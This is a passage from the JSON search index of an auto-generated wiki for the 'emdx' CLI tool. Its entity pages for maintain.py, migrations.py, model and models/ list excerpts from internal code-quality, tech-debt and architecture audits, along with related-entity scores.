artifacts.</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 5. Subcommand Group Sprawl</p> <p>Current structure has 9 subcommand groups:</p> </li> <li> <p><code>tag</code>, <code>trash</code>, <code>exec</code>, <code>task</code>, <code>group</code>, <code>maintain</code>, <code>ai</code>, <code>cascade</code>, <code>delegate</code></p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: HIGH SEVERITY (API Inconsistency)</p> <p>...---------|----------| | <code>tag:batch</code> | <code>--dry-run/--execute</code> | Dry run default | | <code>maintain</code> | <code>--execute/--dry-run</code> | Dry run default | | <code>exec:monitor</code> | <code>--follow/--no-follow</code> | Follow default | | <code>core:save</code> | <code>--gist/--no-gist</code> | No-gist default |</p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 5. Missing or Incomplete --help Descriptions</p> <p>...s interrupted | | <code>tag batch</code> | <code>--execute</code> inverts meaning (default dry-run) | | <code>maintain</code> | <code>--execute/--dry-run</code> inverted from intuition | | <code>group list --parent -1</code> | Magic value for \"top-level only\" undocumented in help |</p> </li> </ul>"},{"location":"entities/maintain/#future-extensions","title":"Future Extensions","text":""},{"location":"entities/maintain/#related-entities","title":"Related Entities","text":"<ul> <li><code>undocumented behaviors</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>inconsistent error output formats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>exec</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>emdx trash list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>breaking contract risks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>api/interface debt audit: emdx cli</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>--rich</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>tag batch</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>missing input validation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/maintainpy/","title":"maintain.py","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2026-01-11</p>"},{"location":"entities/maintainpy/#documents-13","title":"Documents (13)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li> <p><code>_merge_documents(dry_run: bool, threshold: float = 0.7)</code> - No None annotations -...</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Research Summary</p> <p>Analyzed 15+ command modules, the full <code>maintain.py</code> (1481 LOC), <code>core.py</code> save flow, distill/explore/briefing output patterns, synthesis service, entity/wikify services, recipe system, and existing <code>export_profiles</code> schema.</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Critical Issues (Address First)</p> <ol> <li>Monolithic files need decomposition:</li> </ol> </li> <li><code>migrations.py</code>: 2200 lines (39 migrations in one file)</li> <li><code>activity_view.py</code>: 1175 lines</li> <li><code>document_browser.py</code>: 1122 lines</li> <li><code>maintain.py</code>: 1098 lines</li> <li> <p><code>core.py</code>: 876 lines</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2502 \u2502 \u251c\u2500\u2500 core.py       (876 lines) save, find, view, edit, delete\u2502 \u2502 \u251c\u2500\u2500 maintain.py   (1098 lines) maintenance operations       \u2502 \u2502 \u251c\u2500\u2500 delegate.py   (779 lines) AI execution orchestration    \u2502 \u2502 \u2514\u2500\u2500 cascade.py    (754 lines) idea-to-code pipeline...</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 2. Overly Long Functions</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 2: Complexity Hotspots (Readability)</p> <p>...function | | <code>core.py:340</code> | <code>find()</code> | 114 | 30 conditionals, 17 parameters | | <code>maintain.py</code> (4 functions) | various | 347 total | Wizard + cleanup mixed |</p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...ession injection\" | | <code>analyze.py</code> | \"Analyze documents and extract insights\" | | <code>maintain.py</code> | \"Database maintenance and cleanup operations\" |</p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 3: Code Organization &amp; Complexity</p> <p>...ion | | <code>ui/document_browser.py</code> | 1,122 | Needs decomposition | | <code>commands/maintain.py</code> | 1,097 | Needs decomposition** | | <code>commands/core.py</code> | 876 | Consider splitting | | <code>commands/cascade.py</code> | 754 | Consider splitting | | <code>utils/git_ops.py</code> | 75...</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...\u274c NO | | <code>gist.py</code> | \u274c NO | | <code>groups.py</code> | \u2705 YES (<code>test_commands_groups.py</code>) | | <code>maintain.py</code> | \u274c NO | | <code>prime.py</code> | \u274c NO | | <code>recipe.py</code> | \u274c NO | | <code>similarity.py</code> | \u26a0\ufe0f PARTIAL (tests service, some CLI in <code>test_similarity.py</code>) | | <code>status.py</code> | \u274c NO | | `t...</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...[00:02:50] \ud83d\udcbb Using tool: Bash [00:02:50] \ud83d\udcc4 Tool result: diff --git a/emdx/commands/maintain.py b/emdx/commands/maintain.py index f27be2f..7ca6143 100644 ---... [00:02:50] \ud83d\udcc4 Tool result: diff --git a/emdx/applications/maintenance.py b/emdx/applications/maintena...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...function params)</p> </li> <li>tasks.py: All necessary</li> <li>groups.py: All necessary</li> <li>maintain.py: All necessary (return types)</li> <li>tags.py: All necessary</li> <li>stale.py: All necessary</li> <li>recipe.py: All necessary</li> <li>gist.py: All necessary</li> <li> <p>epics.py...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...High Complexity) | Command | LOC | Assessment | |---------|-----|------------| | maintain.py | 1,099 | OVER-ENGINEERED - Maintenance wizard with health scoring, duplicate detection, auto-tagging. Relies on heavy services (health_monitor: 676 LOC, dupli...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 7. Maintenance Command \u2014 exclude_workflow (3 hits)</p> <p>File: <code>emdx/commands/maintain.py</code></p> </li> </ul>"},{"location":"entities/maintainpy/#maintainpy_1","title":"maintain.py","text":"<p>No <code>| None</code> annotations on Typer Options/Arguments - all booleans with defaults.</p>"},{"location":"entities/maintainpy/#24-maintain-in-maintainpy-wizard-high-260-lines","title":"2.4 <code>maintain()</code> in maintain.py + wizard (HIGH - 260 lines)","text":"<p>The <code>_interactive_wizard()</code> function (lines 121-259) does too much inline.</p>"},{"location":"entities/maintainpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>epics.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>models/tags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>models/executions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>legitimate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>iteration_strategies</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.7)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.7)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>keybindings/config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/migrationspy/","title":"migrations.py","text":"<p>Type: heading | Mentioned in: 15 documents | First seen: 2026-01-14</p>"},{"location":"entities/migrationspy/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6432 Any/None typing audit [1/5]   Section: Summary</p> </li> <li> <p>#6611 Emoji alias removal: synthesis   Section: Critical Distinction: Tag Emojis vs. Display Emojis</p> <ol> <li>Tag system emojis (from <code>EMOJI_ALIASES</code>) \u2014 stored in the database, used for categorization. These are what we're removing. Found in: <code>formatting.py</code>, <code>stale.py</code>, <code>recipe.py</code>, <code>migrations.py</code>, and test assertions.</li> </ol> </li> <li> <p>#6407 PR Evaluation: #567, #569, #572, #573, #575 vs mypy PR #588   Section: Summary Table</p> <p>...| &lt;1 day | fix(db): Add COLLATE NOCASE index | 1 | 1 (100%) | CLOSE - Adds to migrations.py which #588 heavily modified | | #573 | &lt;1 day | refactor: Centralize config constants | 15 | 10 (67%) | CLOSE - Heavy overlap, rebase would be painful | | #575 |...</p> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 3. Resource Leaks</p> <ul> <li><code>claude_executor.py:160-183</code> \u2014 Log file handle not closed on exception</li> </ul> </li> <li><code>migrations.py:2224-2240</code> \u2014 Connection opened without context manager</li> <li> <p><code>cascade_service.py:97-146</code> \u2014 Infinite loop risk if process becomes zombie</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Medium-Term (Sprint)</p> <ol> <li>Split migrations.py - Biggest file, most merge conflict risk</li> </ol> </li> <li>Create UI mixins - Largest code deduplication opportunity</li> <li> <p>Extract formatting subpackage - Consolidate scattered formatting</p> </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways   Section: Critical Issues (Priority Order)</p> <ol> <li>6 monolithic files over 700 LOC (migrations.py is 2200 lines)</li> </ol> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Critical Issues (Address First)</p> <ol> <li>Monolithic files need decomposition:</li> </ol> </li> <li><code>migrations.py</code>: 2200 lines (39 migrations in one file)</li> <li><code>activity_view.py</code>: 1175 lines</li> <li><code>document_browser.py</code>: 1122 lines</li> <li><code>maintain.py</code>: 1098 lines</li> <li> <p><code>core.py</code>: 876 lines</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 database/         Core database operations                   \u2502 \u2502 \u251c\u2500\u2500 migrations.py (2200 lines) Schema evolution             \u2502 \u2502 \u251c\u2500\u2500 documents.py  (691 lines) Document CRUD                 \u2502 \u2502 \u251c\u2500\u2500 connection.py Connection management...</p> </li> <li> <p>#6316 Delegate: Comprehensive Codebase Quality Analysis [15/15]   Section: \u26a0\ufe0f Areas for Improvement</p> <p>...sted, UI layer needs attention</p> </li> <li> <p>Type Annotations (511 mypy errors)</p> </li> <li><code>migrations.py</code> (2,021 lines) lacks return type annotations</li> <li> <p>Most errors are <code>[no-untyped-def]</code> in database layer</p> </li> <li> <p>Bare Exception Handling</p> </li> <li> <p>31 instances of `excep...</p> </li> <li> <p>#6315 Delegate: Analyze CODE COMMENTS &amp; DOCUMENTATION across emdx/ (exclude  [2/15]   Section: \u2705 STRENGTHS</p> <p>...egy</p> </li> <li><code>health_monitor.py</code>: Comments explain threshold choices and scoring logic</li> <li> <p><code>migrations.py</code>: Each migration has docstring explaining what and why</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...5 full-text search with ranking</p> </li> <li><code>cascade.py</code>: cascade pipeline metadata</li> <li> <p><code>migrations.py</code>: versioned schema evolution</p> </li> <li> <p>#6183 Delegate: analysis,audit [13/17]   Section: \ud83d\udfe2 Minor</p> <ol> <li>Largest Files (complexity hotspots)    | File | Lines |    |------|-------|    | <code>database/migrations.py</code> | 1,992 |    | <code>commands/maintain.py</code> | 1,101 |    | <code>database/documents.py</code> | 1,063 |</li> </ol> </li> <li> <p>#6179 Delegate: 10 [17/17]   Section: Key Components Added</p> </li> <li>Normalized many-to-many relationship between documents and tags</li> <li>Automatic migration system for existing databases</li> <li> <p>Referential integrity to prevent duplicate/misspelled tags</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Theme 4: Large Files Indicating Architectural Strain</p> <p>...ies | | <code>executor.py</code> | 1,409 | 8% coverage, complex logic, 35 async patterns | | <code>migrations.py</code> | 1,340 | All migrations in one file, missing docstrings | | <code>document_browser.py</code> | 1,147 | Mixed UI/business logic, no tests | | <code>commands/core.py</code> | 1,082 | Many...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...: All necessary</p> </li> <li>cascade.py: All necessary</li> <li>search.py: All necessary</li> <li>migrations.py: All necessary</li> <li>connection.py: All necessary</li> <li>types.py: All necessary (TypedDict definitions)</li> </ul>"},{"location":"entities/migrationspy/#migrationspy_1","title":"migrations.py","text":"<p>No <code>Any</code> usage \u2705</p>"},{"location":"entities/migrationspy/#1-database-design-migrationspy-86-lines","title":"1. Database Design (<code>migrations.py</code> - 86 lines)","text":""},{"location":"entities/migrationspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>lazy loading in main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>connection.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.5)</li> <li><code>active_doc_filter</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>require_document()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.1)</li> <li><code>repositories/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.0)</li> <li><code>search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.8)</li> <li><code>\u2705 strengths</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>\u26a0\ufe0f areas for improvement</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>total python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>document_browser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/model/","title":"model","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/model/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6860 Delegate: FEAT-34 (Issue #1246): Add per-topic model override for wiki [4/4]   Section: Changes made:</p> <ol> <li>Migration 051 (<code>emdx/database/migrations.py</code>): Added <code>model_override TEXT</code> column to <code>wiki_topics</code> table</li> </ol> </li> <li> <p>#6513 Fix Typer type mismatches and dead code   Section: 1. emdx/commands/delegate.py (5 fixes)</p> <p>...| |-----------|--------|-------| | <code>jobs</code> (line 1008) | <code>int</code> | <code>int \\| None</code> | | <code>model</code> (line 1014) | <code>str</code> | <code>str \\| None</code> | | <code>doc</code> (line 1026) | <code>int</code> | <code>int \\| None</code> | | <code>each</code> (line 1064) | <code>str</code> | <code>str \\| None</code> | | <code>do</code> (line 1069) | <code>str</code> | `str...</p> </li> <li> <p>#6506 None Type Analysis [2/7]   Section: File: recipe.py</p> <p>...t[str] | None = typer.Argument(None, help=\"Extra arguments passed to the recipe\"), model: str | None = typer.Option(None, \"--model\", \"-m\", help=\"Model to use\"),</p> </li> </ul> <pre><code>**Verdict: NECESSARY** \u2705 for `extra` (typer.Argument behavior)\n**Verdict: UNNECESSARY** \u26a0...\n\n- **#6502** None Type Analysis [1/7]\n  *Section: emdx/commands/delegate.py*\n  &gt; ...def _run_single(\n    prompt: str,\n    tags: list[str],\n    title: str | None,\n    model: str | None,\n    quiet: bool,\n    pr: bool = False,\n    branch: bool = False,\n    pr_branch: str | None = None,\n    draft: bool = False,\n    working_dir: str | None...\n\n- **#6494** None Type Analysis [5/7]\n  *Section: unified_executor.py*\n  &gt; #### Line 191: `model: str | None = None`\n**Status: NECESSARY**\n- Allows falling back to default model when not specified\n\n- **#6421** Delegate: Research upgrading the anthropic Python SDK from 0.40.0 to 0 [2/5]\n  *Section: Current Usage in EMDX*\n  &gt; ...rt anthropic\nclient = anthropic.Anthropic()\nresponse = client.messages.create(\n    model=self.model,\n    max_tokens=1000,\n    system=\"...\",\n    messages=[{\"role\": \"user\", \"content\": \"...\"}]\n)\ntext = response.content[0].text\n</code></pre> <ul> <li> <p>#6741 Academic Tool Research for Wiki Generation [1/4]   Section: 1. TLDR Auto-Summarization</p> <p>Model: BART-large fine-tuned in 3 stages \u2014 first on XSum (news summarization), then on the SciTLDR dataset (5.4K TLDRs over 3.2K papers), using the CATTS multi-task training strategy.</p> </li> <li> <p>#6452 Implement emdx compact command   Section: Components Created</p> <p>...is_service.py)</p> </li> <li>Purpose: Shared service for AI-powered document synthesis</li> <li>Model: Uses Claude Opus API (claude-opus-4-20250514) for quality-critical merging</li> <li>Key Methods:</li> <li><code>synthesize_documents(doc_ids)</code> - Merges documents into coherent...</li> </ul>"},{"location":"entities/model/#related-entities","title":"Related Entities","text":"<ul> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: n/a</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>verdict: both necessary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer.option(none, ...)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>view<code>(lines 772-852)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>save<code>(lines 186-337)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>find<code>(lines 340-551)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>edit<code>(lines 928-1043)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typer command:</code>delegate<code>(lines 983-1331)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/models/","title":"models/","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-02-14</p>"},{"location":"entities/models/#documents-12","title":"Documents (12)","text":"<ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Overview</p> <p>Three parallel audits covered the entire <code>emdx/</code> codebase \u2014 <code>services/</code> (+ <code>cli_executor/</code>), <code>config/</code>, <code>models/</code>, and <code>utils/</code>. The combined results reveal significant dead code accumulation across the project.</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: All 45 TypedDicts (by location)</p> </li> <li> <p>#6338 Architecture Improvements: Implementation Summary   Section: Remaining Opportunities (Not Implemented)</p> </li> <li>Rename <code>models/</code> to <code>repositories/</code> - would break many imports</li> <li>Decompose <code>find()</code> function (210 lines) - refactoring risk</li> <li> <p>Standardize return types (dict vs dataclass) - large-scale type changes</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026   Section: Issue 1: <code>models/</code> Directory Naming (PARTIALLY ADDRESSED)</p> <p>Analysis Finding: <code>models/</code> is misnamed - contains raw SQL operations, not domain models.</p> </li> <li> <p>#6332 Architecture Analysis Summary - Key Takeaways   Section: Critical Issues (Priority Order)</p> <ol> <li><code>models/</code> directory misnamed - Contains SQL operations (repositories), not domain models. Rename to <code>repositories/</code>.</li> </ol> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Critical Issues (Address First)</p> <ol> <li><code>models/</code> directory is misnamed - Contains raw SQL operations (repositories), not domain models. This causes confusion about which layer to import from.</li> </ol> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 models/           Data models (actually repositories)        \u2502 \u2502 \u251c\u2500\u2500 executions.py Raw SQL operations                        \u2502 \u2502 \u251c\u2500\u2500 tags.py       Raw SQL operations...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 1. Architectural Strengths</p> <p>...d Architecture**: Clean separation between <code>commands/</code>, <code>services/</code>, <code>database/</code>, <code>models/</code>, and <code>ui/</code></p> </li> <li>Lazy Loading: Heavy commands (cascade, delegate, AI) use lazy imports for fast CLI startup</li> <li> <p>Strategy Pattern: CLI executor factory (`cli_execu...</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 1: Architecture Issues (High Impact)</p> Finding Severity Details <code>models/</code> is a database layer CRITICAL All files in <code>models/</code> do raw SQL \u2014 they're repositories, not domain models. Rename to <code>repositories/</code> or merge into <code>database/</code> </li> <li> <p>#6307 Delegate: Analyze ERROR HANDLING PATTERNS across emdx/ (exclude ui/ an [6/15]   Section: Module-by-Module Analysis</p> <p>...s | | <code>utils/</code> | 7/10 | Consistent patterns, some silent catches need logging | | <code>models/</code> | 8/10 | Proper sqlite3 exception handling | | <code>database/</code> | 8/10 | Good integrity error handling |</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: Layer Architecture Overview</p> <p>...----| | <code>commands/</code> | CLI handlers | CLI + presentation + some business logic | | <code>models/</code> | Domain models | Database access layer (VIOLATION) | | <code>database/</code> | Database operations | Pure database operations | | <code>services/</code> | Business logic | Business...</p> </li> </ul>"},{"location":"entities/models/#modelstypespy-7-typeddicts","title":"<code>models/types.py</code> \u2014 7 TypedDicts","text":"TypedDict total=False? <code>TaskDict</code> no <code>TaskLogEntryDict</code> no <code>GameplanStatsDict</code> no `CategoryDict..."},{"location":"entities/models/#low-priority","title":"Low-Priority","text":""},{"location":"entities/models/#related-entities","title":"Related Entities","text":"<ul> <li><code>repositories/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.1)</li> <li><code>lazy loading in main.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>architectural strengths</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>worst offenders by</code>dict[str, any]<code>count:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>what's good</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>ui/keybindings/config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>type safety coverage audit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>toolcallmessage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>tool_uses</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>database/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/modelsexecutionspy/","title":"models/executions.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/modelsexecutionspy/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Common Themes</p> <ol> 